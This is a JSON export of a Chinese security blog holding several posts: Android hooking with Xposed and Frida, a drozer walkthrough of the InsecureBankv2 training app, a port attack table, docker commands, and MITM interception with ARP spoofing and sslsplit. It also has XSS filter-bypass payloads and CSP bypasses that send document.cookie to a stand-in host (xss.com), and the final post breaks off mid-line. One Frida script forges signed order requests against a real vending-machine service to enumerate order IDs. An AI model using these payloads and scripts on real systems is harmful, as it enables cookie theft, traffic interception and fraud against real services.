[{"title":"浅谈android hook技术","date":"2017-01-05T03:12:16.000Z","path":"2017/01/05/移动安全/浅谈android hook技术/","text":"前言xposed框架xposed，主页：http://repo.xposed.info/module/de.robv.android.xposed.installer是个开源的框架，在github上有源码的，直接下载apk后安装激活就可以使用，很多地方有这方面的教程，针对不同的手机架构，有大牛做了针对性的修改。可以在论坛中进行搜索 通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。 Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码 很多人将这个框架用在对android的私有化定制上面，其实在android安全测试方面这个框架提供了很大的便利，xposed主要是对方法的hook，在以往的重打包技术中，需要对smali代码的进行修改，修改起来比较麻烦。 利用xposed框架可以很容易的获取到android应用中的信息，比如加密私钥、salt值等等，不需要饭编译获取密钥转换算法、不需要了解密钥保存机制，直接hook函数，获取输入输出就可以。 原理在Android系统中，应用程序进程都是由Zygote进程孵化出来的，而Zygote进程是由Init进程启动的。Zygote进程在启动时会创建一个Dalvik虚拟机实例，每当它孵化一个新的应用程序进程时，都会将这个Dalvik虚拟机实例复制到新的应用程序进程里面去，从而使得每一个应用程序进程都有一个独立的Dalvik虚拟机实例。这也是Xposed选择替换app_process的原因。Zygote进程在启动的过程中，除了会创建一个Dalvik虚拟机实例之外，还会将Java运行时库加载到进程中来，以及注册一些Android核心类的JNI方法来前面创建的Dalvik虚拟机实例中去。注意，一个应用程序进程被Zygote进程孵化出来的时候，不仅会获得Zygote进程中的Dalvik虚拟机实例拷贝，还会与Zygote一起共享Java运行时库。这也就是可以将XposedBridge这个jar包加载到每一个Android应用程序中的原因。XposedBridge有一个私有的Native（JNI）方法hookMethodNative，这个方法也在app_process中使用。这个函数提供一个方法对象利用Java的Reflection机制来对内置方法覆写。有能力的可以针对xposed的源码进行分析，不得不说，作者对于android的机制和java的了解已经相当深入了。 简单实例很简单的一个android登入代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243public class MainActivity extends AppCompatActivity &#123; private TextView accountView; private TextView passwdView; private Button loginBut; private Button quitBut; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); accountView = (TextView) findViewById(R.id.account); passwdView = (TextView) findViewById(R.id.pwd); loginBut = (Button) findViewById(R.id.login); quitBut = (Button) findViewById(R.id.quit); loginBut.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; String username = accountView.getText() + &quot;&quot;; String password = passwdView.getText() + &quot;&quot;; if(isCorrectInfo(username,password))&#123; Toast.makeText(MainActivity.this,&quot;登入成功&quot;,Toast.LENGTH_LONG).show(); &#125; else&#123; Toast.makeText(MainActivity.this,&quot;登入失败&quot;,Toast.LENGTH_LONG).show(); &#125; &#125; &#125;); &#125; public boolean isCorrectInfo(String username, String password) &#123; if(username.equals(&quot;admin&quot;) &amp;&amp; password.equals(&quot;passwd&quot;))&#123; return true; &#125; else&#123; return false; &#125; &#125;&#125; 很简单的就是判断下用户输入的用户名和密码是正确，这里做个简单的演示，将用户输入的用户名和密码信息hook出来不管正确与否 简单说下xposed模块的开发，首先需要的是导入api，具体的可以参考：https://github.com/rovo89/XposedBridge/wiki/Using-the-Xposed-Framework-API 在manifest中定义 1234567891011&lt;application android:label=\"xposed\"&gt; &lt;meta-data android:name=\"xposedmodule\" android:value=\"true\" /&gt; &lt;meta-data android:name=\"xposeddescription\" android:value=\"hook test\" /&gt; &lt;meta-data android:name=\"xposedminversion\" android:value=\"82\" /&gt; &lt;/application&gt; 声明这个是xposed模块，名称为hook test 并且使用api版本号是82 下面创建运行时候的hook代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.example.xposed;import java.util.List;import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XposedBridge;import de.robv.android.xposed.callbacks.XC_LoadPackage;import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;public class Main implements IXposedHookLoadPackage &#123; // 包加载的时候回调 public void handleLoadPackage(final XC_LoadPackage.LoadPackageParam lpparam) throws Throwable &#123; //过滤掉不是com.example.logintest的应用 if (!lpparam.packageName.equals(\"com.example.logintest\")) return; XposedBridge.log(\"加载应用:\" + lpparam.packageName); // Hook MainActivity 中的判断方法 findAndHookMethod(\"com.example.logintest.MainActivity\", lpparam.classLoader, \"isCorrectInfo\", String.class,String.class new XC_MethodHook() &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; super.beforeHookedMethod(param); // XposedBridge.log(\"开始劫持~~~~\"); // XposedBridge.log(\"参数1:\" + param.args[0]); XposedBridge.log(\"参数2:\" + param.args[1]); XposedBridge.log(\"修改登入数据~~~~\");// 修改为正确的用户名密码 param.args[0]=\"admin\"; param.args[1]=\"passwd\"; &#125; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123;// super.afterHookedMethod(param); XposedBridge.log(\"劫持结束~~~~\");// XposedBridge.log(\"参数1:\" + param.args[0]);// XposedBridge.log(\"参数2:\" + param.args[1]); &#125; &#125;); &#125;&#125; 看代码中的注释，主要是三个方法的调用，handleLoadPackage，主要是获取到android包的相关信息，这里由于只是对logintest进行hook,做下简单的判断。 findAndHookMethod 是主要的hook入口，里面几个参数分别为包名，classloader，hook的函数名，参数类型（这个比较容易出错，比如list类型写为List.class）,回调函数 回调函数中比较重要的：beforeHookedMethod和afterHookedMethod，一个是在函数运行前劫持掉，一个是hook后放行，实例中对用户输入的字段进行劫持打印，后面将参数之改为正确登入用户名和密码，这样在app中输入任何字符都能登入成功 frida Hook框架Frida是一款基于python + javascript 的hook框架，通杀android\\ios\\linux\\win\\osx等各平台，由于是基于脚本的交互，因此相比xposed和substrace cydia更加便捷，本文重点介绍Frida在android下面的使用。 Frida的官网为：http://www.frida.re/ 安装安装Frida非常简单，在pc端直接执行1pip install frida 即可 在Android设备需要导入frida的服务端，需要root你的手机 123$ curl -O http://build.frida.re/frida/android/arm/bin/frida-server$ chmod+x frida-server$ adb push frida-server /data/local/tmp/ 运行设备上运行frida-server: 1234$ adb shellroot@android:/ # chmod 700 frida-server$ adb shellroot@android:/ # /data/local/tmp/frida-server -t 0 (注意在root下运行) 电脑上运行adb forward tcp转发: 12adb forward tcp:27042 tcp:27042adb forward tcp:27043 tcp:27043 27042端口用于与frida-server通信,之后的每个端口对应每个注入的进程. 运行如下命令验证是否成功安装: 1$ frida-ps-R 正常情况应该输出进程列表如下: 123456PID NAME 1590 com.facebook.katana13194 com.facebook.katana:providers12326 com.facebook.orca13282 com.twitter.android… Hook模块的编写hook的主要模块是js编写的，利用javascript的api与server进行通信 下面结合一个真实例子进行简单的介绍，首先是测试代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# -*- coding:utf-8 -*-import frida, sys #引入frida类import logginglogging.basicConfig(filename='test.log', level=logging.INFO)reload(sys)sys.setdefaultencoding('utf-8') #对输出进行utf8的编码print sys.getdefaultencoding()def print_result(message): #对输出的信息进行打印 print message logging.info(message)def on_message(message, data): # 反调函数，用来接受message的信息，message后面会说到 try: print_result(message=message) except: passdid = \"255601452\" # 订单idtime = \"1472706588\" # 时间戳jscode = \"\"\" # 核心代码，这段主要是调用app中的相应处理函数，后面会分析这段代码的来源Dalvik.perform(function () &#123; # 说明是Dalvik平台 var currentApplication = Dalvik.use(\"android.app.ActivityThread\").currentApplication(); var context = currentApplication.getApplicationContext(); var signclass = Dalvik.use(\"com.ub.main.d.e\");# 调用com.ub.main.d.e类 var signInstance=signclass.$new(context); # 反射创建一个新的对象 var sign=signInstance.a(\"255601452\"); #调用对象的a函数 send(sign); #将调用函数的结果发送出来&#125;);\"\"\"#print jscodeprocess = frida.get_device_manager().enumerate_devices()[-1].attach(\"com.ub.main\") # 获取连接的设备并枚举取最后一个设备连接，并附到com.ub.main的进程上面print processscript = process.create_script(jscode) # 调用相应的js函数，获取函数调用后的结果值script.on('message', on_message) # 利用回调，将message传递给on_message函数print \"done\"script.load() 反编译获取app中的核心函数对于上面的js代码，其实就是调用app中的某个函数，比如sign值生成函数，加密解密函数，不需要自己单独的去分析算法流程，分析key值在哪，直接调用app的相应函数，让app帮我们完成这些工作 这里我们分析的app是友宝，这是一款饮料售货机，当时抓包看到提货的时候是只有个订单id的，猜想是不是遍历订单的id，支付成功但是没有取货的订单会不会响应请求，自己掉货出来 下面对友宝的订单进行分析过程 抓取支付订单成功链接 123http://monk.uboxol.com/morder/shipping?clientversion=5.7.2&amp;machine_type=MI+5&amp;os=6.0.1&amp;channel_id=1&amp;device_no=02%3A00%3A00%3A00%3A00%3A00&amp;imei=869161021849708&amp;device_id=2&amp;u=32020&amp;wake_id=0&amp;net_type=1&amp;carrier_type=1&amp;s=4postdata：sign=et09HgkvWcNc%252FTLe3E7Qj4j6MZEPbnm2zbCzJ3esTi0n6qo6T2RE6Qggh3rYytoTbKHGC1O3ghNPPZqoXSF%252FlzsRK2BnkLouKdZ%252BLnyZgdGrYgOyRv2piGOHnUwAhz5%252BUOWbH5ljMvNBgvTJwWsTy200bW2FAA%252BRkqNCn%252F4qIvo%253D&amp;orderId=255601452&amp;timestamp=1472706588 分析：sign是校验值，主要是防止订单伪造的，orderid是产生的支付订单id，这个主要是防止伪造用 反编译友宝app 找到morder/shipping所在的包为：com/ub/main/d/e.class 其中localStringBuffer存储的就是url中的参数信息，该请求查找到的代码在a() 生成签名的函数在com/ub/main/d/e.class中的b函数 最后加上sign值，发送请求 可以反编译出他的sign计算方法，也可以直接调用b函数来产生sign值，后来发现app会自动取时间戳，我们就不需要给他array型的参数 直接调用a函数，把orderId给他，让他直接return一个值出来就好了，就有了上面的js代码 自动化的批量处理 看代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# __author__ = 'adrain'# -*- coding:utf-8 -*-import frida, sysimport loggingimport requestslogging.basicConfig(filename='test.log', level=logging.INFO)reload(sys)sys.setdefaultencoding('utf-8')# print sys.getdefaultencoding()class ubox: def __init__(self): pass def request(self, payload): # print \"requests\" dict = &#123;&#125; url = \"http://monk.uboxol.com/morder/shipping?clientversion=5.7.2&amp;machine_type=MI+5&amp;os=6.0.1&amp;channel_id=1&amp;device_no=02%3A00%3A00%3A00%3A00%3A00&amp;imei=869161021849708&amp;device_id=2&amp;u=41493965&amp;wake_id=0&amp;net_type=1&amp;carrier_type=1&amp;s=4\" for i in payload.split(\"&amp;\"): key = i.split(\"=\")[0] value = i.split(\"=\")[1] dict[key] = value data=dict r=requests.post(url=url,data=data) print r.text def print_result(self, message): # print message payload = message[\"payload\"] print payload self.request(payload) def on_message(self, message, data): self.print_result(message=message) def fuzzing(self, did): jscode = \"\"\" Dalvik.perform(function () &#123; var currentApplication = Dalvik.use(\"android.app.ActivityThread\").currentApplication(); var context = currentApplication.getApplicationContext(); var signclass = Dalvik.use(\"com.ub.main.d.e\"); var signInstance=signclass.$new(context); var sign=signInstance.a(\"%s\"); send(sign); &#125;); \"\"\" % did # print jscode process = frida.get_device_manager().enumerate_devices()[-1].attach(\"com.ub.main\") # print process script = process.create_script(jscode) script.on('message', self.on_message) # print \"done\" script.load() # sys.stdin.read()ub = ubox()ub.fuzzing(\"255912964\") 构造了一个类，后面直接fuzz uid就可以了，提取里面的sign值拼接到post数据中去 可以产生的post请求和抓到的数据包的请求是完全一样的，但是并没有测试成功，分析原因有可能是订单id和用户的id有所绑定。 不过学习到了怎样通过frida对app进行分析。 复杂参数的hook如果遇到函数的参数类型是数组、map、ArrayList类型的，首先目标MyClass类的fun1函数，声明如下： 12public static boolean fun1(String[][] strAry, Map mp1, Map&lt;String,String&gt; mp2, Map&lt;Integer, String&gt; mp3, ArrayList&lt;String&gt; al1, ArrayList&lt;Integer&gt; al2, ArgClass ac) 解决方法： 用Xposed自身提供的XposedHelpers的findClass方法加载每一个类，然后再将得到的类传递给hook函数作参数！ 实例代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package aqcxbom.myxposed;import android.util.Log;import de.robv.android.xposed.IXposedHookLoadPackage;import de.robv.android.xposed.XC_MethodHook;import de.robv.android.xposed.XposedHelpers;import de.robv.android.xposed.callbacks.XC_LoadPackage;/** * Created by AqCxBoM on 2016/12/24. */public class XposedMain implements IXposedHookLoadPackage&#123; public String TAG = &quot;AqCxBoM&quot; ; private final String mStrPackageName = &quot;aqcxbom.xposedhooktarget&quot;; //HOOK APP目标的包名 private final String mStrClassPath = &quot;aqcxbom.xposedhooktarget.MyClass&quot;; //HOOK 目标类全路径 private final String mStrMethodName = &quot;fun1&quot;; //HOOK 目标函数名 private void LOGI(String ct)&#123; Log.d(TAG, ct); &#125; @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable &#123; //判断包名是否一致 if (loadPackageParam.packageName.equals(mStrPackageName)) &#123; LOGI(&quot;found target: &quot; + loadPackageParam.packageName); final Class&lt;?&gt; ArgClass= XposedHelpers.findClass(&quot;aqcxbom.xposedhooktarget.ArgClass&quot;, loadPackageParam.classLoader); final Class&lt;?&gt; ArrayList= XposedHelpers.findClass(&quot;java.util.ArrayList&quot;, loadPackageParam.classLoader); final Class&lt;?&gt; Map= XposedHelpers.findClass(&quot;java.util.Map&quot;, loadPackageParam.classLoader); //包名一致时查找是否有匹配参数的类及函数 XposedHelpers.findAndHookMethod(mStrClassPath, //类路径 loadPackageParam.classLoader, //ClassLoader mStrMethodName, //目标函数名 &quot;[[Ljava.lang.String;&quot;, //参数1 Map, //参数2 Map, //参数3 Map, //参数4 ArrayList, //参数5 ArrayList, //参数6 ArgClass, //参数7 new XC_MethodHook() &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123; super.beforeHookedMethod(param); //这个函数会在被hook的函数执行前执行 LOGI(&quot;beforeHook&quot;); &#125; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; super.afterHookedMethod(param);//这个函数会在被hook的函数执行后执行 LOGI(&quot;afterHooke param: &quot;); &#125; &#125;); &#125; &#125;&#125; 参考链接：https://xianzhi.aliyun.com/forum/read/611.html http://www.freebuf.com/articles/terminal/56453.html http://bbs.pediy.com/showthread.php?t=202147&amp;page=2","tags":[{"name":"移动安全","slug":"移动安全","permalink":"https://adrain09.github.io/tags/移动安全/"}]},{"title":"常见端口安全测试","date":"2017-01-03T03:12:16.000Z","path":"2017/01/03/安全测试/常见端口安全测试/","text":"端口号 端口说明 攻击技巧 21/22/69 ftp/tftp 爆破、嗅探、溢出、后门 22 ssh 爆破 23 telnet 爆破 25 smtp 邮件伪造 53 DNS DNS域传送、DNS劫持、DNS欺骗 67、68 dhcp 爆破 110 pop3 爆破 139 samba 爆破、未授权访问、远程代码执行 143 imap 爆破 161 snmp 爆破 389 ldap 注入攻击、未授权访问 512/513/514 linux r 直接使用rlogin 873 rsync 未授权访问 1080 socket 爆破：进行内网渗透 1352 lotus 爆破：弱口令 信息泄漏：源代码 1433 mssql 爆破：使用系统用户登录 注入攻击 1521 oracle 爆破：TNS 注入攻击 2049 nfs 配置不当 2181 zookeeper 未授权访问 3306 mysql 爆破 拒绝服务 注入 3389 rdp 爆破 Shift后门 4848 glassfish 爆破：控制台弱口令 认证绕过 5000 sybase/DB2 爆破 注入 5432 postgresql 缓冲区溢出 注入攻击 爆破：弱口令 5632 pcanywhere 拒绝服务 代码执行 5900 vnc 爆破：弱口令 认证绕过 6379 redis 未授权访问 爆破：弱口令 7001 weblogic Java反序列化 控制台弱口令 控制台部署webshell 80/443/8080 web 常见web攻击 控制台爆破 对应服务器版本漏洞 8069 zabbix 远程命令执行 9090 websphere控制台 爆破：控制台弱口令 Java反序列 9200/9300 elasticsearch 远程代码执行 11211 memcacache 未授权访问 27017 mongodb 爆破 未授权访问","tags":[{"name":"安全测试","slug":"安全测试","permalink":"https://adrain09.github.io/tags/安全测试/"}]},{"title":"docker 常用命令","date":"2016-12-21T03:12:16.000Z","path":"2016/12/21/soft/docker常用命令/","text":"查看镜像docker images 查看运营的容器docker ps 运行 ubuntudocker run -i -t daocloud.io/ubuntu:14.04 /bin/bash 运行ubuntu, 退出时自动删除容器docker run -i -t –rm daocloud.io/ubuntu:14.04 /bin/bash 切换machine，使用docker-vmeval “$(docker-machine env docker-vm)” ####切换到 dev machineeval “$(docker-machine env dev)” 停止所有容器docker stop $(docker ps -a -q) 删除指定镜像docker rmi $image 删除无标示镜像，即id为的镜像docker rmi $(docker images | grep “^“ | awk “{print $3}”) 删除所有镜像docker rmi $(docker images -q) 杀死所有正在运行的容器docker kill $(docker ps -a -q) 删除所有已经停止的容器docker rm $(docker ps -a -q) 删除所有未打 dangling 标签的镜像docker rmi $(docker images -q -f dangling=true) 删除所有镜像docker rmi $(docker images -q) 查看内存、CPU的使用情况docker stats $(docker ps -q) CONTAINER CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O452bc3877700 0.03% 480.2 MB / 1.044 GB 45.98% 2.028 kB / 648 B 0 B / 0 Bc2c1dda7e9bb 0.01% 11.93 MB / 1.044 GB 1.14% 7.096 kB / 3.522 kB 0 B / 0 Bf35f291d6659 0.00% 9.806 MB / 1.044 GB 0.94% 8.638 kB / 8.422 kB 0 B / 0 Bdocker-machine 查看机器列表docker-machine lsNAME ACTIVE DRIVER STATE URL SWARM DOCKER ERRORSdefault * virtualbox Running tcp://192.168.99.100:2376 v1.10.3 查看机器状态docker-machine status default 登录机器defaultdocker-machine ssh defaultdocker-compose 查看运行中的容器docker-compose ps Name Command State Portsdockerfiles_mysql_1 docker-entrypoint.sh mysqld Up 0.0.0.0:3306-&gt;3306/tcpdockerfiles_nginx_1 nginx -g daemon off; Up 443/tcp, 0.0.0.0:8080-&gt;80/tcpdockerfiles_php_1 php-fpm Up 0.0.0.0:9000-&gt;9000/tcp 运行容器docker-compose up","tags":[{"name":"soft","slug":"soft","permalink":"https://adrain09.github.io/tags/soft/"}]},{"title":"wireshark 普通用户启动","date":"2016-12-19T03:12:16.000Z","path":"2016/12/19/移动安全/wireshark 普通用户启动/","text":"添加wireshark用户组 1sudo groupadd wireshark 将dumpcap更改为wireshark用户组 1sudo chgrp wireshark /usr/bin/dumpcap 让wireshark用户组有root权限使用dumpcap 1sudo chmod 4755 /usr/bin/dumpcap 将需要使用的用户名加入wireshark用户组，我的用户名是craftor 1sudo gpasswd -a craftor wireshark","tags":[{"name":"移动安全","slug":"移动安全","permalink":"https://adrain09.github.io/tags/移动安全/"}]},{"title":"drozer测试InsecureBankv2","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/移动安全/drozer测试InsecureBankv2/","text":"测试app包名：com.android.insecurebankv2 intent sniffer(数据嗅探) 利用app.broadcast.sniff 模块 首先apktool获取manifest文件，查看receiver组件，获取触发该组件的intent-filter的action name 利用run app.broadcast.sniff –action theBroadcast 进行嗅探 结果获取到修改的密码信息：123456Broadcast receiver registered to sniff matching intents[*] Output is updated once a second. Press Control+C to exit.Action: theBroadcastRaw: Intent &#123; act=theBroadcast flg=0x10 (has extras) &#125;Extra: newpass=Dinesh@123! (java.lang.String)Extra: phonenumber=15555215554 (java.lang.String) 代码层次： 获取到代码，查看注册recever的名称，这个是接受信息；可搜索sendBroadcast来查找谁发的广播 登入绕过 可查看manifast文件查找exported=“true”的activity名称 可以直接使用drozer activity模块查找暴露出的activity 测试：直接调用com.android.insecurebankv2.PostLogin 绕过登入，直接进入转帐等页面 备份安全测试 可查看manifast文件查看是否允许备份allowBackup=”true” 可利用drozer模块：run app.package.backup -f insecurebankv2查看 测试： 在当前目录下备份，在当前目录下会产生backup.ab 文件： 1adb backup -apk-shared com.android.insecurebankv2 读取该文件，后面可以看到登入账户的所有信息 1cat backup.ab | (dd bs=24 count=0 skip=1; cat) | zlib-flate -uncompress &gt; backup_compressed.tar (ab的解压未成功) jdb调试app程序 使用adb jdwp来查看那些app是可以被调试的，再次运行insecurebankv2，运行adb jdwp来查看最新增加的ID，记录（注：也可以直接使用ddms来查看可以被调试的app的pid） 使用adb forward tcp:1111 jdwp: pid 将调试端口转发到本地主机端口上 使用jdb -attach localhost:1111 链接调试端口，进行调试 测试： 实验中主要是更改变量属性值，app会检查设备的root情况并且输出出来 本来为rooted，直接更改为 not rooted 可能用到的命令： class：查看所有用到的包名methods：进入到相应的函数中，这里是：methods com.android.insecurebankv2.PostLogin直接在showRootStatus()方法上下断点，jdb主要命令step – 执行当前行step up – 执行到当前方法返回到其调用程序stepi – 执行当前指令next – 跳过一行（跨过调用）cont – 从断点处继续执行 运行过程中，观察locals的本地变量 出现变量：isrooted=true，利用set isrooted=false进行变量设置 run运行，发现提示变为未root hack 广播接受者,恶意发送短信 run app.broadcast.info 查看是否有暴露出的receiver，查看manifest文件，观察启动该接受者的action 在反编译代码中查找该reveicer 本例中代码： 12345public void onReceive(Context paramContext, Intent paramIntent)&#123;Object localObject = paramIntent.getStringExtra(&quot;phonenumber&quot;);paramIntent = paramIntent.getStringExtra(&quot;newpass&quot;);并且在下面调用了 ((SmsManager)localObject).sendTextMessage(paramContext, null, paramIntent, null, null);发送短信 触发这个的reveicer的代码： 12345678910111213private void broadcastChangepasswordSMS(String paramString1, String paramString2)&#123;if (TextUtils.isEmpty(paramString1.toString().trim()))&#123;System.out.println(&quot;Phone number Invalid.&quot;);return;&#125;Intent localIntent = new Intent();localIntent.setAction(&quot;theBroadcast&quot;);localIntent.putExtra(&quot;phonenumber&quot;, paramString1);localIntent.putExtra(&quot;newpass&quot;, paramString2);sendBroadcast(localIntent);&#125; 直接调用am命令： 1adb shell am broadcast -a theBroadcast -n com.android.insecurebankv2/com.android.insecurebankv2.MyBroadCastReceiver --es phonenumber 15210601846 --es newpass Dinesh@123$ 可以直接启动一个广播 可以使用drozer 启动： 1run app.broadcast.send --action theBroadcast --component com.android.insecurebankv2 com.android.insecurebankv2.MyBroadCastReceiver --extra string phonenumber 15210601846 --extra string newpass ddddsadsad hack 数据库，provider drozer里面的命令run scanner.provider.finduris -a com.android.insecurebankv2扫描可以利用的provider 利用 run app.provider.query 进行查询 在代码中主要是在manifest中查找可以用的provider，再在代码中查看provider的url链接 1adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers 查看 攻击复制的数据adb shell su u0_a51 service call clipboard 2 s16 包名 攻击数据库若是数据库没有加密的话，直接pull下来，查看即可 不安全的log直接ddms或者adb logcat读取敏感数据 导出内存数据（未测试）ddms导出hprof ，利用platform-tools 工具：./hprof-conv com.android.insecurebankv2.hprof SSSSS.hprof格式化，利用app的内存分析工具分析内存。 加密解密在sharepreferen中可以看到用户名和密码信息，不过都是采用了加密的处理,但是在代码中可以看到采用了硬加密的处理方式,并且有明文的iv和密钥信息，采用的AES的cbc模式加密处理","tags":[{"name":"移动安全","slug":"移动安全","permalink":"https://adrain09.github.io/tags/移动安全/"}]},{"title":"中间人攻击获取ssl数据","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/","text":"数据流量重定向 使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。你不需要物理访问受害者的设备就能做到。 手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法 DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。 修改受害者机器的/etc/hosts的条目来 转向某些域名的流量 ARP欺骗 环境： 攻击者ip:192.168.31.200 操作主机 网关：192.168.31.1 路由器 受害者：192.168.31.224 手机或电脑 开启ip转发 echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward 生成CA证书 12openssl genrsa -out ca.key 4096openssl req -new -x509 -days 1826 -key ca.key -out ca.crt 第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key 第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt) 这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。 端口流量转发 用iptables进行流量转发，需要把我们需要的端口进行转发 8080用作非SSL的TCP连接，比如 http, smtp, ftp8443 用作SSL的连接，比如SMTP over SSL, HTTPS等 12345678sysctl -w net.ipv4.ip_forward=1iptables -t nat -Fiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 ARP欺骗 ettercap -T -q -M ARP //192.168.31.224/ //192.168.31.1/ arpspoof -i eth0 -t 192.168.31.1 192.168.31.224 直接建立热点 kali下可以直接建立热点，需要打开iptables的nat功能123iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源natiptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度 使用SSLsplit进行 sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 使用starttls-mitm进行(https://github.com/adrain09/starttls-mitm)","tags":[{"name":"安全测试","slug":"安全测试","permalink":"https://adrain09.github.io/tags/安全测试/"}]},{"title":"XSS向量","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/web安全/xss向量/","text":"css xss向量 1&lt;style&gt;@import%20url(http://www.xsec.io/static/upload/1.css);%20z-index:9999 利用反引号 123456&lt;!DOCTYPE html BLAH&gt;&lt;html&gt;&lt;p onmouseover=alert`2`&gt;2121212&lt;/p&gt;&lt;p onmouseover=id=/confir/.source+&apos;m&apos;+&apos;(1)&apos;;onmousedown=eval(id)&gt; 11111&lt;/p&gt;&lt;a href=&quot;j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(&amp;Tab;document.domain&amp;Tab;);//http://www.baidu.com&quot;&gt;点击此处&lt;/a&gt;&lt;/html&gt; 利用%2f 1&lt;body%2fonmouseover=alert(1)&gt;&lt;/body&gt; 利用html实体在href中html实体是可以反解出来的 1&lt;a href=javascrpi:&amp;#67lert(1)&gt;xss&lt;/a&gt; 其他： 123456789101112131415161718192021222324252627&quot;onmouseover=%0A&quot;confirm(1)/* HTML5 based entities were doing good in bypassing data URI RE */&lt;a href=&apos;data&amp;colon;text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+&apos;&gt;click&lt;/a&gt;&lt;a href=&apos;data:application/x-x509-user-cert;&amp;NewLine;base64&amp;NewLine;, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&apos;&gt;click&lt;/a&gt;/* Both are Firefox specific payloads */ /* The RE initially thinks that base64 keyword is necessary. */&lt;a href=&quot;data:x,% 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;/* The RE thinks that only alphanumeric characters are allowed after data URI */&lt;a href=&quot;data:@[&apos;&#123;§(`__`)$&#125;&apos;]@, % 3 c script % 3 e alert(1) % 3 c/script %3 e&quot;&gt;click&lt;/a&gt;/* The first two payloads bypasses the check on word expression with the help of \\ */&lt;div style=&quot;x:e\\x\\p\\r\\ession(alert(1))&quot;&gt;div&lt;/div&gt;&lt;p style=&apos;\\x:\\65xpre\\73sio\\6e(alert(1))&apos;&gt;hello barracuda&lt;/p&gt;/* The regular expression was expecting ( after the keyword expression */&lt;div style=&quot;width:expression\\28 alert \\28 1\\29 \\29&quot;&gt;I will bypass you&lt;/div&gt;/* Decimal Encoding without the presence of ; bypasses the regular expression */&lt;div style=&quot;width&amp;#58expression&amp;#40alert&amp;#40 1&amp;#41&amp;#41&quot;&gt;I will not match&lt;/div&gt;","tags":[{"name":"web安全","slug":"web安全","permalink":"https://adrain09.github.io/tags/web安全/"}]},{"title":"CSP bypass","date":"2016-12-16T03:12:16.000Z","path":"2016/12/16/web安全/绕过csp发送cookie/","text":"dns 預读取 firefox 1&lt;link rel=&quot;dns-prefetch&quot; href=&quot;[cookie].xss.com&quot;&gt;dns chrome 1234chrome浏览器的csp策略对&lt;link&gt;标签rel属性则更为宽松,使用prefetch即可直接用get方式把cookie传递到攻击者的服务器上&lt;link rel=&quot;prefetch&quot; href=&quot;http://www.xss.com/x.php?c=[cookie]&quot;&gt;只需要用js动态创建元素的方法,就可在href中插入cookie 通用的bypass 其实在script脚本允许unsafe-inline的情况下,会有更多的通用,而且无法被过滤的绕过方式,比如: 123&lt;script&gt;window.location=&quot;http://www.xss.com/x.php?c=[cookie]&quot;;&lt;/script&gt; 比如动态创建元素,再引发页面跳转 123var a=document.createElement(&quot;a&quot;);a.href=&apos;http://www.xss.com/?c=&apos;+escape(document.cookie);a.click(); 或者是使用标签进行跳转 1&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;url=http://www.xss.com/x.php?c=[cookie]&quot; &gt; 123var 